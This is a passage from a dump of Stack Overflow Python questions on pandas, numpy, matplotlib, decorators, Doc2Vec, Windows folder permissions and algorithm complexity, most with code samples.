  <p>Reserved for Microsoft compatibility.</p>
  
  <p><code>uuid.</code><strong><code>RESERVED_FUTURE</code></strong> <a href=""https://docs.python.org/3.5/library/uuid.html#uuid.RESERVED_FUTURE"" rel=""nofollow"">Â¶</a></p>
  
  <p>Reserved for future definition.</p>
</blockquote>

<p>Given this, I expected to see integers when accessing these attributes. However:</p>

<pre><code>&gt;&gt;&gt; import uuid
&gt;&gt;&gt; u = uuid.uuid4()
&gt;&gt;&gt; u.variant
'specified in RFC 4122'
&gt;&gt;&gt; uuid.RESERVED_NCS
'reserved for NCS compatibility'
&gt;&gt;&gt; uuid.RFC_4122
'specified in RFC 4122'
&gt;&gt;&gt; uuid.RESERVED_MICROSOFT
'reserved for Microsoft compatibility'
&gt;&gt;&gt; uuid.RESERVED_FUTURE
'reserved for future definition'
</code></pre>

<p>This produces the same result in 2.7.9 and 3.4.2, and I haven't found documentation for any version that suggests that these constants might be strings.</p>

<p>The most relevant search results I could produce on this issue happen to be the source code for this module (on <a href=""https://svn.python.org/projects/python/trunk/Lib/uuid.py"" rel=""nofollow"">SVN</a> or <a href=""https://github.com/python/cpython/blob/master/Lib/uuid.py"" rel=""nofollow"">GitHub</a>), which contains this statement:</p>

<blockquote>
<pre><code>RESERVED_NCS, RFC_4122, RESERVED_MICROSOFT, RESERVED_FUTURE = [
    'reserved for NCS compatibility', 'specified in RFC 4122',
    'reserved for Microsoft compatibility', 'reserved for future definition']
</code></pre>
</blockquote>

<p>Given the results I saw in the interpreter, this makes perfect sense, but I can't say the same for the documentation.</p>

<p>Is this a simple documentation bug, or is there someplace where these attributes would indeed be integers, as the documentation promises? What's going on here?</p>
"
40082844,6728093.0,2016-10-17 09:30:24+00:00,3,slicing series of panels,"<p>I have a simple dataframe:</p>

<pre><code>&gt;&gt;&gt; df = pd.DataFrame(np.random.randint(0,5,(20, 2)), columns=['col1','col2'])
&gt;&gt;&gt; df['ind1'] = list('AAAAAABBBBCCCCCCCCCC')
&gt;&gt;&gt; df.set_index(['ind1'], inplace=True)
&gt;&gt;&gt; df

      col1  col2
ind1            
A        0     4
A        1     2
A        1     0
A        4     1
A        1     3
A        0     0
B        0     4
B        2     0
B        3     1
B        0     3
C        1     3
C        2     1
C        4     0
C        4     0
C        4     1
C        3     0
C        4     4
C        0     2
C        0     2
C        1     2
</code></pre>

<p>I am trying to get the rolling correlation coefficient of its two columns:</p>

<pre><code>&gt;&gt;&gt; df.groupby(level=0).rolling(3,min_periods=1).corr()

ind1
A    &lt;class 'pandas.core.panel.Panel'&gt;
Dimensions: ...
B    &lt;class 'pandas.core.panel.Panel'&gt;
Dimensions: ...
C    &lt;class 'pandas.core.panel.Panel'&gt;
Dimensions: ...
dtype: object
</code></pre>

<p>The problem is that the result is series of panels:</p>

<pre><code>&gt;&gt;&gt; type(df.groupby(level=0).rolling(3,min_periods=1).corr())

pandas.core.series.Series
</code></pre>

<p>I am able to get desired coefficient for each row separately...</p>

<pre><code>&gt;&gt;&gt; df.groupby(level=0).rolling(3,min_periods=1).corr()['A']

&lt;class 'pandas.core.panel.Panel'&gt;
Dimensions: 10 (items) x 2 (major_axis) x 2 (minor_axis)
Items axis: C to C
Major_axis axis: col1 to col2
Minor_axis axis: col1 to col2

&gt;&gt;&gt; df.groupby(level=0).rolling(3,min_periods=1).corr().loc['A'].ix[2]

          col1      col2
col1  1.000000 -0.866025
col2 -0.866025  1.000000

&gt;&gt;&gt; df.groupby(level=0).rolling(3,min_periods=1).corr().loc['A'].ix[2,'col1','col2']

-0.86602540378443849
</code></pre>

<p>...but I don't know how to slice the result (series of panels) in order to assign the results as a column to existing dataframe.  Something like:</p>

<pre><code>df['cor_coeff'] = df.groupby(level=0).rolling(3,min_periods=1).corr()['some slicing']
</code></pre>

<p>Any clues? Or a better way to get rolling correlation coefficients?</p>
"
39883656,6928678.0,2016-10-05 21:04:53+00:00,3,"Combining dataframes in pandas with the same rows and columns, but different cell values","<p>I'm interested in combining two dataframes in pandas that have the same row indices and column names, but different cell values. See the example below:</p>

<pre><code>import pandas as pd
import numpy as np

df1 = pd.DataFrame({'A':[22,2,np.NaN,np.NaN],
                    'B':[23,4,np.NaN,np.NaN],
                    'C':[24,6,np.NaN,np.NaN],
                    'D':[25,8,np.NaN,np.NaN]})

df2 = pd.DataFrame({'A':[np.NaN,np.NaN,56,100],
                    'B':[np.NaN,np.NaN,58,101],
                    'C':[np.NaN,np.NaN,59,102],
                    'D':[np.NaN,np.NaN,60,103]})

In[6]: print(df1)
      A     B     C     D
0  22.0  23.0  24.0  25.0
1   2.0   4.0   6.0   8.0
2   NaN   NaN   NaN   NaN
3   NaN   NaN   NaN   NaN

In[7]: print(df2)
       A      B      C      D
0    NaN    NaN    NaN    NaN
1    NaN    NaN    NaN    NaN
2   56.0   58.0   59.0   60.0
3  100.0  101.0  102.0  103.0
</code></pre>

<p>I would like the resulting frame to look like this:</p>

<pre><code>       A      B      C      D
0   22.0   23.0   24.0   25.0
1    2.0    4.0    6.0    8.0
2   56.0   58.0   59.0   60.0
3  100.0  101.0  102.0  103.0
</code></pre>

<p>I have tried different ways of pd.concat and pd.merge but some of the data always gets replaced with NaNs. Any pointers in the right direction would be greatly appreciated.</p>
"
39834523,3861449.0,2016-10-03 14:54:40+00:00,3,Updating matplotlib plot during code execution,"<p>I have found that the latest update to python/matplotlib has broken a crucial feature, namely, the ability to regularly update or ""refresh"" a matplotlib plot during code execution. Below is a minimally (non-)working example.</p>

<pre><code>import numpy as np
from matplotlib.pyplot import *
from time import sleep

x = np.array([0])
y = np.array([0])

figure()
for i in range(51):
    gca().cla()
    plot(x,y)
    xlim([0,50])
    ylim([0,2500])
    draw()
    show(block = False)
    x = np.append(x,[x[-1]+1])
    y = np.append(y,[x[-1]**2])
    sleep(0.01)
</code></pre>

<p>If I run this program using Python 3.4.3 and matplotlib 1.4.3, I can see the plot continually update, and the curve grows as the program runs. However, using Python 3.5.1 with matplotlib 1.5.3, the matplotlib window opens but does not show the plot. Instead, it continually shows the window is ""not responding"" and only presents the final plot when the code finishes executing.</p>

<p>What can I do about this? Is there some way to achieve the functionality that I want using the latest release?</p>

<p>Note: I'm running this from the default IDLE environment if that makes a difference.</p>
"
39926567,931154.0,2016-10-07 22:20:40+00:00,3,Python create decorator preserving function arguments,"<p>I'm trying to write a decorator that preserves the arguments of the functions it decorates. The motivation for doing this is to write a decorator that interacts nicely with <code>pytest.fixtures</code>.</p>

<p>Suppose we have a function <code>foo</code>. It takes a single argument <code>a</code>.</p>

<pre><code>def foo(a):
    pass
</code></pre>

<p>If we get the argument spec of foo</p>

<pre><code>&gt;&gt;&gt; inspect.getargspec(foo)
ArgSpec(args=['a'], varargs=None, keywords=None, defaults=None)
</code></pre>

<p>We frequently want to create a decorator where the <code>wrapper</code> function passes all of its arguments verbatim to the <code>wrapped</code> function. The most obvious way to do this using <code>*args</code> and <code>**kwargs</code>, though, produces a function with a different argument spec.</p>

<pre><code>def identity_decorator(wrapped):
    def wrapper(*args, **kwargs):
        return wrapped(*args, **kwargs)
    return wrapper

    def identity_decorator(wrapped):
    def wrapper(*args, **kwargs):
        return wrapped(*args, **kwargs)
    return wrapper

@identity_decorator
def foo(a):
    pass
</code></pre>

<p>This, not surprisingly, produces a function with an argument spec reflecting the <code>*args</code> and <code>**kwargs</code>.</p>

<pre><code>&gt;&gt;&gt; inspect.getargspec(foo)
ArgSpec(args=[], varargs='args', keywords='kwargs', defaults=None)
</code></pre>

<p>Is there a way to either change the argument spec to match the wrapped function or create the function with the right argument spec initially?</p>
"
39926628,484944.0,2016-10-07 22:28:31+00:00,3,Numpy reshape acts different on copied vs. uncopied arrays,"<p>I've come across seemingly inconsistent results when flattening certain numpy arrays with numpy.reshape. Sometimes if I reshape an array it returns a 2D array with one row, whereas if I first copy the array then do the exact same operation, it returns a 1D array. </p>

<p>This seems to happen primarily when combining numpy arrays with scipy arrays, and creates alignment problems when I want to later multiply the flattened array by a matrix.</p>

<p>For example, consider the following code:</p>

<pre><code>import numpy as np
import scipy.sparse as sps

n = 10
A = np.random.randn(n,n)
I = sps.eye(n)
X = I+A

x1 = np.reshape(X, -1)
x2 = np.reshape(np.copy(X), -1)

print 'x1.shape=', x1.shape
print 'x2.shape=', x2.shape
</code></pre>

<p>When run it prints:</p>

<pre><code>x1.shape= (1, 100)
x2.shape= (100,)
</code></pre>

<p>The same thing happens with numpy.flatten(). What is going on here? Is this behavior intentional?</p>
"
39658717,4497662.0,2016-09-23 10:37:51+00:00,3,Plot dynamically changing graph using matplotlib in Jupyter Notebook,"<p>I have a M x N 2D array: ith row represents that value of N points at time i. </p>

<p>I want to visualize the points [1 row of the array] in the form of a graph where the values get updated after a small interval. Thus the graph shows 1 row at a time, then update the values to next row, so on and so forth. </p>

<p>I want to do this in a jupyter notebook. Looking for reference codes. </p>

<p>I tried following things but no success:</p>

<p><a href=""http://community.plot.ly/t/updating-graph-with-new-data-every-100-ms-or-so/812"" rel=""nofollow"">http://community.plot.ly/t/updating-graph-with-new-data-every-100-ms-or-so/812</a></p>

<p><a href=""https://pythonprogramming.net/live-graphs-matplotlib-tutorial/"" rel=""nofollow"">https://pythonprogramming.net/live-graphs-matplotlib-tutorial/</a></p>

<p><a href=""http://stackoverflow.com/questions/5618620/create-dynamic-updated-graph-with-python"">Create dynamic updated graph with Python</a></p>

<p><a href=""http://stackoverflow.com/questions/11371255/update-lines-in-matplotlib"">Update Lines in matplotlib</a></p>
"
40098500,7033980.0,2016-10-18 02:19:17+00:00,3,The `or` operator on dict.keys(),"<p>As I've been unable to find any documentation on this, so I'll ask here. </p>

<p>As shown in the code below, I found that the <code>or</code> operator (<code>|</code>), worked as such:</p>

<pre><code>a = {""a"": 1,""b"": 2, 2: 3}
b = {""d"": 10, ""e"": 11, 11: 12}

keys = a.keys() | b.keys()
aonce = a.keys() | a.values()
bonce = b.keys() | b.values()

for i in keys:
    print(i, end="" "")
print()
for i in aonce:
    print(i, end="" "")
print()
for i in bonce:
    print(i, end="" "")
print()
</code></pre>

<p>Which produces the result, in some order:</p>

<pre><code>2 d 11 a b e   
3 1 2 a b   
10 e 11 12 d   
</code></pre>

<p>Initially I assumed these iterable was compatible with <code>|</code>, similar to the way sets are, however. Testing with other iterable, such as a <code>list.__iter__()</code>, threw an error. Even;  </p>

<pre><code>values = a.values() | b.values()
for i in values:
    print(i, end="" "") 
print()
</code></pre>

<p>Which I'd assume worked, due to the use of <code>dict.values()</code> in the previous examples, threw an error.</p>

<p>So, my question is; What on earth have I come across, and more importantly, how reliable is it? What subclass does my arguments need to be, for me to be able to use this?</p>
"
39843584,2530674.0,2016-10-04 03:13:27+00:00,3,gensim Doc2Vec vs tensorflow Doc2Vec,"<p>I'm trying to compare my implementation of Doc2Vec (via tf) and gensims implementation. It seems atleast visually that the gensim ones are performing better.</p>

<p>I ran the following code to train the gensim model and the one below that for tensorflow model. My questions are as follows:</p>

<ol>
<li>Is my tf implementation of Doc2Vec correct. Basically is it supposed to be concatenating the word vectors and the document vector to predict the middle word in a certain context?</li>
<li>Does the <code>window=5</code> parameter in gensim mean that I am using two words on either side to predict the middle one? Or is it 5 on either side. Thing is there are quite a few documents that are smaller than length 10.</li>
<li>Any insights as to why Gensim is performing better? Is my model any different to how they implement it?</li>
<li>Considering that this is effectively a matrix factorisation problem, why is the TF model even getting an answer? There are infinite solutions to this since its a rank deficient problem. &lt;- This last question is simply a bonus.</li>
</ol>

<h3>Gensim</h3>

<pre><code>model = Doc2Vec(dm=1, dm_concat=1, size=100, window=5, negative=10, hs=0, min_count=2, workers=cores)
model.build_vocab(corpus)
epochs = 100
for i in range(epochs):
    model.train(corpus)
</code></pre>

<h3>TF</h3>

<pre><code>batch_size = 512
embedding_size = 100 # Dimension of the embedding vector.
num_sampled = 10 # Number of negative examples to sample.


graph = tf.Graph()

with graph.as_default(), tf.device('/cpu:0'):
    # Input data.
    train_word_dataset = tf.placeholder(tf.int32, shape=[batch_size])
    train_doc_dataset = tf.placeholder(tf.int32, shape=[batch_size/context_window])
    train_labels = tf.placeholder(tf.int32, shape=[batch_size/context_window, 1])

    # The variables   
    word_embeddings =  tf.Variable(tf.random_uniform([vocabulary_size,embedding_size],-1.0,1.0))
    doc_embeddings = tf.Variable(tf.random_uniform([len_docs,embedding_size],-1.0,1.0))
    softmax_weights = tf.Variable(tf.truncated_normal([vocabulary_size, (context_window+1)*embedding_size],
                             stddev=1.0 / np.sqrt(embedding_size)))
    softmax_biases = tf.Variable(tf.zeros([vocabulary_size]))

    ###########################
    # Model.
    ###########################
    # Look up embeddings for inputs and stack words side by side
    embed_words = tf.reshape(tf.nn.embedding_lookup(word_embeddings, train_word_dataset),
                            shape=[int(batch_size/context_window),-1])
    embed_docs = tf.nn.embedding_lookup(doc_embeddings, train_doc_dataset)
    embed = tf.concat(1,[embed_words, embed_docs])
    # Compute the softmax loss, using a sample of the negative labels each time.
    loss = tf.reduce_mean(tf.nn.sampled_softmax_loss(softmax_weights, softmax_biases, embed,
                                   train_labels, num_sampled, vocabulary_size))

    # Optimizer.
    optimizer = tf.train.AdagradOptimizer(1.0).minimize(loss)
</code></pre>
"
40096308,6632212.0,2016-10-17 21:55:15+00:00,3,Why getting Memory Error? Python,"<p>I have a 5gb text file and i am trying to read it line by line. 
My file is in format-: Reviewerid&lt;\t>pid&lt;\t>date&lt;\t>title&lt;\t>body&lt;\n>
This is my code </p>

<pre><code>o = open('mproducts.txt','w')
with open('reviewsNew.txt','rb') as f1:
    for line in f1:
        line = line.strip()
        line2 = line.split('\t')
        o.write(str(line))
        o.write(""\n"")
</code></pre>

<p>But i get Memory error when i try to run it. I have an 8gb ram and 1Tb space then why am i getting this error? I tried to read it in blocks but then also i get that error.</p>

<pre><code>MemoryError 
</code></pre>
"
40096323,6224363.0,2016-10-17 21:56:29+00:00,3,Lambda function does not return correct value,"<p>Im trying to make a variant of the Gillespie algorithm, and to determine the reaction propensities Im trying to automatically generate the propensity vector using lambda expressions. However when creating SSA.P all goes wrong. The last loop in the block of code, PROPLOOP, returns two propensities, where the one generated using P_alternative is the correct one. The question is: how do I get the same values for SSA.P as for SSA.P_alternative?</p>

<pre><code>import numpy as np
from numpy.random import uniform
class Markov:
  def __init__(self,z0,t0,tf,rates,stoich):
    self.S=stoich

    self.z0=z0
    self.rates=rates

    self.P=self.propensities()
    self.P_alternative=[
      lambda z,rate:(0.5*rate[0]*z[0]*(z[0]-1)),
      lambda z,rate:rate[1]*np.prod(z[0]),
      lambda z,rate:rate[2]*np.prod(z[1]),
      lambda z,rate:rate[3]*np.prod(z[1]),
      lambda z,rate:rate[4]*np.prod(z[np.array([0,1])]),
      lambda z,rate:rate[5]]

    self.t0=t0
    self.tf=tf


  def propensities(self):
    prop=[]
    for i,reac in enumerate(self.S.T):
      if all(z&gt;=0 for z in reac):
        prop.append(lambda z,rate:rate[i])

      if any(z==-1 for z in reac):
        j=np.where(reac==-1)[0]
        prop.append(lambda z,rate:rate[i]*np.prod(z[j]))

      if any(z==-2 for z in reac):
        j=np.where(reac==-2)[0][0]
        prop.append(lambda z,rate:(0.5*rate[i]*z[j]*(z[j]-1))[0])

    return prop


stoich=np.array([
        [-2, -1,  2,  0, -1,  0],
        [ 1,  0, -1, -1, -1,  1],
        [ 0,  0,  0,  1,  1,  0]])

rates=np.array([1.0,0.02,200.0,0.0004,0.9,0.9])

z0=np.array([540,730,0])

SSA=Markov(z0=z0,t0=0,tf=100,rates=rates,stoich=stoich)

#PROPLOOP; the values should be equal for both SSA.P and SSA.P_alternative, where SSA.P_alternative is the correct one
for i in xrange(len(SSA.P)):
  print ""Inexplicably wrong"",SSA.P[i](z0,rates)
  print ""Correct answer"",SSA.P_alternative[i](z0,rates), ""\n""
</code></pre>

<p>output is:</p>

<pre><code>Inexplicably wrong 130977.0
Correct answer 145530.0 

Inexplicably wrong 354780.0
Correct answer 10.8 

Inexplicably wrong 354780.0
Correct answer 146000.0 

Inexplicably wrong 354780.0
Correct answer 0.292 

Correct answer 354780.0
Correct answer 354780.0 

Inexplicably wrong 0.9
Correct answer 0.9 
</code></pre>
"
39956313,4080911.0,2016-10-10 10:35:21+00:00,3,Vectorise Python code,"<p>I have coded a kriging algorithm but I find it quite slow. Especially, do you have an idea on how I could vectorise the piece of code in the cons function below:</p>

<pre><code>import time
import numpy as np

B = np.zeros((200, 6))
P = np.zeros((len(B), len(B)))

def cons():
  time1=time.time()
  for i in range(len(B)):
    for j in range(len(B)):
      P[i,j] = corr(B[i], B[j])
  time2=time.time()
  return time2-time1

def corr(x,x_i):
  return np.exp(-np.sum(np.abs(np.array(x) - np.array(x_i))))    

time_av = 0.
for i in range(30):
  time_av+=cons()
print ""Average="", time_av/100.
</code></pre>

<hr>

<p>Edit: Bonus questions</p>

<ol>
<li>What happens to the broadcasting solution if I want <code>corr(B[i], C[j])</code> with C the same dimension than B</li>
<li><p>What happens to the scipy solution if my p-norm orders are an array:</p>

<pre><code>p=np.array([1.,2.,1.,2.,1.,2.])
def corr(x, x_i):
  return np.exp(-np.sum(np.abs(np.array(x) - np.array(x_i))**p))  
</code></pre>

<p>For 2., I tried <code>P = np.exp(-cdist(B, C,'minkowski', p))</code> but scipy is expecting a scalar.</p></li>
</ol>
"
39842758,6902790.0,2016-10-04 01:09:12+00:00,3,How to have a Custom User model for my app while keeping the admins working as default in Django?,"<p>Here is what I am trying to accomplish: <br/></p>

<p>  - Have admins login to the admin page using the default way (username and password).</p>

<p> - Have users register/login to my web app using a custom User Model which uses email instead of password. They can also have other data associated that I don't need for my admins.</p>

<p> - Separate the admin accounts and user accounts into different tables. </p>

<p></p>

<p>I checked how to create a Custom User class by extending AbstracBaseUser, but the result I got is that my admins also became the new user type. So can I have the Custom User model be used for my app users while keeping the default admin system untouched? Or what is a good alternative to my design?</p>
"
40133826,6408619.0,2016-10-19 14:10:53+00:00,3,Python save list and read data from file,"<p>Basically I would like to save a list to python and then when the program starts I would like to retrieve the data from the file and put it back into the list.
<br> 
So far this is the code I am using</p>

<pre><code>mylist = pickle.load(""save.txt"")
...
saveToList = (name, data)
mylist.append(saveList)
import pickle
pickle.dump(mylist, ""save.txt"")
</code></pre>

<p>But it just returns the following error: TypeError: file must have 'read' and 'readline' attributes</p>
"
39842253,5504555.0,2016-10-04 00:00:54+00:00,3,Traversing subfolder files?,"<p>I have wrote a script to erase a given word from docx files and am at my last hurdle of it checking subfolder items as well. Can someone help me in figuring out where I am failing in my execution. It works with all the files within the same directory but it won't also check subfolder items right now. Thanks for your help.</p>

<pre><code>#!/usr/bin/env python3

# Search and Replace all docx

import os, docx

from docx import Document


findText = input(""Type text to replace: "")                              

#replaceText = input('What text would you like to replace it with: ')    


for dirs, folders, files in os.walk('.'):
    for subDirs in dirs:
        print('The Sub is ' + subDirs)
        for fileNames in files:
            print(subDirs + fileNames)
            if fileNames.endswith('.docx'):
                newDirName = os.path.abspath(subDirs)
                fileLocation = subDirs + '\\' + fileNames
                document = docx.Document(fileLocation)
                print('Document is:' + fileLocation)

                tables = document.tables
                for table in tables:
                    for row in table.rows:
                        for cell in row.cells:
                            for paragraph in cell.paragraphs:
                                if findText in paragraph.text:                              
                                    inline = paragraph.runs                                 
                                    for i in range(len(inline)):
                                        if findText in inline[i].text:
                                            text = inline[i].text.replace(findText, '')
                                            inline[i].text = text

                for paragraph in document.paragraphs:                           
                    if findText in paragraph.text:                              
                        inline = paragraph.runs                                 
                        for i in range(len(inline)):
                            if findText in inline[i].text:
                                text = inline[i].text.replace(findText, '')
                                inline[i].text = text

                document.save(fileLocation)  
</code></pre>
"
39885723,308827.0,2016-10-06 00:33:07+00:00,3,Interpolating 2 numpy arrays,"<p>Is there any numpy or scipy or python function to interpolate between two 2D numpy array's? I have two 2D numpy arrays, and I want to apply changes to the first numpy array to make it similar to the second 2D array. The constraint is that I want the changes to be smooth. e.g., let the arrays be:</p>

<pre><code>A
[[1 1 1
  1 1 1
  1 1 1]]
</code></pre>

<p>and</p>

<pre><code>B
[[34  100 15
  62  17  87
  17  34  60]]
</code></pre>

<p>To make A similar to B, I could add 33 to the first grid cell of <code>A</code> and so on.. However, to make the changes smoother, I plan to compute a mean using a 2x2 window on array <code>B</code> and then apply the resulting changes to array <code>A</code>. Is there a built in numpy or scipy method to do this or follow this approach without using for loop.</p>
"
39646401,6866350.0,2016-09-22 18:29:43+00:00,3,How to merge the elements in a list sequentially in python,"<p>I have a list <code>[ 'a' , 'b' , 'c' , 'd']</code>. How do I get the list which joins two letters sequentially i.e the ouptut should be <code>[  'ab', 'bc' , 'cd']</code> in python easily instead of manually looping and joining</p>
"
39599192,2965673.0,2016-09-20 16:20:00+00:00,3,Fill in time data in pandas,"<p>I have data that is every 15 seconds. But, there are some values that are missing.  These are not tagged with NaN, but simply are not present.  How can I fill in those values?<br>
I have tried to resample, but that also shifts my original data.  So, why doesn't this work:</p>

<pre><code>a=pd.Series([1.,3.,4.,3.,5.],['2016-05-25 00:00:35','2016-05-25 00:00:50','2016-05-25 00:01:05','2016-05-25 00:01:35','2016-05-25 00:02:05'])                                   
a.index=pd.to_datetime(a.index)
a.resample('15S').mean()

In [368]: a
Out[368]: 
2016-05-25 00:00:35    1.0
2016-05-25 00:00:50    3.0
2016-05-25 00:01:05    4.0
2016-05-25 00:01:35    3.0
2016-05-25 00:02:05    5.0
dtype: float64
</code></pre>

<p>It shows me this:</p>

<pre><code>2016-05-25 00:00:30    1.0
2016-05-25 00:00:45    3.0
2016-05-25 00:01:00    4.0
2016-05-25 00:01:15    NaN
2016-05-25 00:01:30    3.0
2016-05-25 00:01:45    NaN
2016-05-25 00:02:00    5.0
Freq: 15S, dtype: float64
</code></pre>

<p>So, I no longer have a value at 00:35 or 00:50.<br>
For my original larger data set, I also end up seeing many NaN value in large groups at the end of the resampled data.<br>
What I would like to do resample my 15s data, to 15s, so whenever there is no data present for a particular time it should use the mean of the values around it to fill it in.  Is there a way to do that?<br>
Also, why does the time basis change when I resample?  My original data starts at 00:00:35 and after resampling it starts at 00:30?  It seems like it got shifted by 5 seconds.<br>
In my example data, all it should have done is created an additional data entry at 00:01:50. </p>

<hr>

<p><strong>Edit</strong></p>

<p>I realized that my data is slightly more complex then I had thought.  The 'base' actually changes part way through it.  If I use the solution below, then it works for part of the data, but then the values stop changing.  For example:</p>

<pre><code>a = pd.Series([1.,3.,4.,3.,5.,6.,7.,8.], ['2016-05-25 00:00:35','2016-05-25 00:00:50','2016-05-25 00:01:05','2016-05-25 00:01:35','2016-05-25 00:02:05','2016-05-25 00:03:00','2016-05-25 00:04:00','2016-05-25 00:06:00'])                                   

In [79]: a
Out[79]: 
2016-05-25 00:00:35    1.0
2016-05-25 00:00:50    3.0
2016-05-25 00:01:05    4.0
2016-05-25 00:01:35    3.0
2016-05-25 00:02:05    5.0
2016-05-25 00:03:00    6.0
2016-05-25 00:04:00    7.0
2016-05-25 00:06:00    8.0
dtype: float64

In [80]: a.index = pd.to_datetime(a.index)

In [81]: a.resample('15S', base=5).interpolate()
Out[81]: 
2016-05-25 00:00:35    1.0
2016-05-25 00:00:50    3.0
2016-05-25 00:01:05    4.0
2016-05-25 00:01:20    3.5
2016-05-25 00:01:35    3.0
2016-05-25 00:01:50    4.0
2016-05-25 00:02:05    5.0
2016-05-25 00:02:20    5.0
2016-05-25 00:02:35    5.0
2016-05-25 00:02:50    5.0
2016-05-25 00:03:05    5.0
2016-05-25 00:03:20    5.0
2016-05-25 00:03:35    5.0
2016-05-25 00:03:50    5.0
2016-05-25 00:04:05    5.0
2016-05-25 00:04:20    5.0
2016-05-25 00:04:35    5.0
2016-05-25 00:04:50    5.0
2016-05-25 00:05:05    5.0
2016-05-25 00:05:20    5.0
2016-05-25 00:05:35    5.0
2016-05-25 00:05:50    5.0
Freq: 15S, dtype: float64
</code></pre>

<p>As you can see it stops interpolating after 2:05, and seems to ignore the data at 3:00,4:00 and 5:00.  </p>
"
39598618,6797207.0,2016-09-20 15:51:03+00:00,3,Pandas Filter on date for quarterly ends,"<p>In the index column I have a list of dates:</p>

<pre><code>DatetimeIndex(['2010-12-31', '2011-01-02', '2011-01-03', '2011-01-29',
           '2011-02-26', '2011-02-28', '2011-03-26', '2011-03-31',
           '2011-04-01', '2011-04-03',
           ...
           '2016-02-27', '2016-02-29', '2016-03-26', '2016-03-31',
           '2016-04-01', '2016-04-03', '2016-04-30', '2016-05-31',
           '2016-06-30', '2016-07-02'],
          dtype='datetime64[ns]', length=123, freq=None)
</code></pre>

<p>However I want to filter out all those which the month and day equal to 12/31, 3/31, 6/30, 9/30 to get the value at the end of the quarter. </p>

<p>Is there a good way of going about this?</p>
"
39684300,6546677.0,2016-09-25 07:04:11+00:00,3,How can I make use of intel-mkl with tensorflow,"<p>I've seen a lot of documentation about making using of a CPU with tensorflow, however, I don't have a GPU. What I do have is a fairly capable CPU and a holing 5GB of intel math kernel, which, I hope, might help me speed up tensorflow a fair bit.</p>

<p>Does anyone know how I can ""make"" tensorflow use the intel-mlk ?</p>
"
39876729,6926025.0,2016-10-05 14:28:53+00:00,3,Python windows service to automatically grant folder permissions creates duplicate ACEs,"<p>I wrote a windows service in Python that scans a given directory for new folders. Whenever a new folder is created, the service creates 4 sub-folders and grants each one a different set of permissions. The problem is that within those subfolders, any folders created (essentially tertiary level, or sub-sub-folders)
have the following error when accessing the permissions (through right-click-> properties->security): </p>

<p><strong>""The permissions on test folder are incorrectly ordered, which may cause some entries to be ineffective""</strong> </p>

<p>To reiterate, we have folder A which is scanned. When I create folder B in folder A, folders 1,2,3,4 are created within B, with permissions provided by the script. Any folders created within (1,2,3,4) have the above error when opening up the directory permissions. Furthermore, the security entries for SYSTEM, Administrators and Authenticated Users appear twice when clicking on advanced.</p>

<p>The relevant portion of code is: </p>

<pre><code>import win32security
import ntsecuritycon

for rw_user in rw:
    sd=win32security.GetFileSecurity(in_dir+""\\""+dir_,win32security.DACL_SECURITY_INFORMATION)
    dacl=sd.GetSecurityDescriptorDacl()
    dacl.AddAccessAllowedAceEx(sec.ACL_REVISION_DS,sec.OBJECT_INHERIT_ACE|sec.CONTAINER_INHERIT_ACE,con.FILE_GENERIC_READ|con.FILE_ADD_FILE,p_dict[rw_user][0])

    sd.SetSecurityDescriptorDacl(1,dacl,0)
    win32security.SetFileSecurity(in_dir+""\\""+dir_,win32security.DACL_SECURITY_INFORMATION,sd)
</code></pre>

<p>This is based on the example found in <a href=""http://stackoverflow.com/questions/12168110/setting-folder-permissions-in-windows-using-python"">Setting folder permissions in Windows using Python</a></p>

<p>Any help is greatly appreciated.</p>

<p>***EDITED TO ADD:</p>

<p>This is the output of icacls.exe on the folder created by the service:</p>

<pre><code>PS C:\&gt; icacls ""C:\directory monitor\main\center\test\request""
C:\directory monitor\main\center\test\request PNIM\jmtzlilmi:(OI)(CI)(R,WD)
                                                PNIM\jmtzlilmi:(OI)(CI)(W,Rc)
                                                PNIM\jmtzlilmi:(OI)(CI)(R,WD)
                                                PNIM\jmtzlilmi:(OI)(CI)(W,Rc)
                                                BUILTIN\Administrators:(I)(F)
                                                BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                NT AUTHORITY\SYSTEM:(I)(F)
                                                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                                BUILTIN\Users:(I)(OI)(CI)(RX)
                                                NT AUTHORITY\Authenticated Users:(I)(M)
                                                NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
</code></pre>

<p>This is the output of icacls on the directory that I created within the automatically created folder, the one that has duplicate entries:</p>

<pre><code>PS C:\&gt; icacls ""C:\directory monitor\main\center\test\request\test folder""
C:\directory monitor\main\center\test\request\test folder PNIM\jmtzlilmi:(OI)(CI)(R,WD)
                                                            PNIM\jmtzlilmi:(OI)(CI)(W,Rc)
                                                            PNIM\jmtzlilmi:(OI)(CI)(R,WD)
                                                            PNIM\jmtzlilmi:(OI)(CI)(W,Rc)
                                                            BUILTIN\Administrators:(F)
                                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                            NT AUTHORITY\SYSTEM:(F)
                                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                                            BUILTIN\Users:(OI)(CI)(RX)
                                                            NT AUTHORITY\Authenticated Users:(M)
                                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
</code></pre>

<p>The folder being monitored by the service is called center, the folder I created within is called test. The service then creates ""request"" within test, and I created ""test folder"" within request (yes, I'm brilliant at naming folders, I know. It's a bit more coherent in production.)</p>

<p>EDITED AGAIN:</p>

<p>Copied the wrong bit of code. I used AddAccessAllowedAceEx and NOT AddAccessAllowedAce. Many apologies...</p>
"
39910941,1325133.0,2016-10-07 06:40:19+00:00,3,Logging each in/out of each function,"<p>Currently I typically add a log line to my functions with details of the variables that are inputted and returned. However I am looking for an elegant way around this.</p>

<p>Is there a way to log each input to a function and what is returned using some form of magic methods?</p>

<p>Below is an example,</p>

<pre><code>class exampleclass(object):
    def __init__(self,size=False):
        self.size = size

    def funt1(self,weight=None):
        return weight

    def funt2(self,shape=None):
        return shape
</code></pre>

<p>Here I want to log the returned variable and also what is inputted for each function using the smallest amount of code possible.</p>
"
40066778,6457193.0,2016-10-16 04:19:15+00:00,3,why is this o(n) three-way set disjointness algorithm slower than then o(n^3) version?,"<p>O(n) because converting list to set is O(n) time, getting intersection is O(n) time and len is O(n)</p>

<pre><code>def disjoint3c(A, B, C):
    """"""Return True if there is no element common to all three lists.""""""
    return len(set(A) &amp; set(B) &amp; set(C)) == 0
</code></pre>

<p>or similarly, should be clearly O(N)</p>

<pre><code>def set_disjoint_medium (a, b, c):
    a, b, c = set(a), set(b), set(c)
    for elem in a:
        if elem in b and elem in c:
